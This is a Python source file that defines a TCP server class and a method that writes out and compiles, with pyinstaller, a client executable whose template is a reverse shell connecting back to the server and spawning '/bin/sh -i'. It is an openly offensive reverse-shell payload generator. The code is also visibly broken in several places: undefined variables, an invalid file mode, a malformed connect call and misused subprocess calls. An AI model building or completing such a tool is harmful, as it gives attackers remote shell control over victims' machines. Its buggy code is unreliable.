import socket
import ctypes
import subprocess


class sockets:
    class multiclient:
        def __init__(self):
            self.ip = ip
            self.port = port
            self.thread = thread

        def bind(self, ip, port):
            pass

        def listen(self, thread):
            pass

        def createTCPServer(self):
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(self.thread)

            while True:
                client_socket, client_address = server_socket.accept()
                print(f"Connected by {client_address}")

                while True:
                    data = client_socket.recv(1024)  # Receive up to 1024 bytes
                    if not data:
                        break
                    print(f"Received: {data.decode()}")
                    client_socket.sendall(data)  # Echo the data back

                client_socket.close()
                print(f"Connection with {client_address} closed")

        # client execution compiler; generates an executable that connects to the server.
        def CEC(self):
            with open('client_temp.py', 'rw') as file:
                client_template_source = [
                    "import socket",
                    "import os"
                    "",
                    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
                    f"s.connect(str({self.ip}, {self.port}))",
                    "os.dup2(s.fileno(), 0)",
                    "os.dup2(s.fileno(), 1)",
                    "os.dup2(s.fileno(), 2)",
                    "subprocess.call(['/bin/sh', '-i'])"
                ]
                
                for lines in client_template_source:
                    file.write(lines)
                
                subprocess.call(['pyinstaller'], ['--onefile'], ['client_temp.py'])
                subprocess.call(['rm client_temp.py'])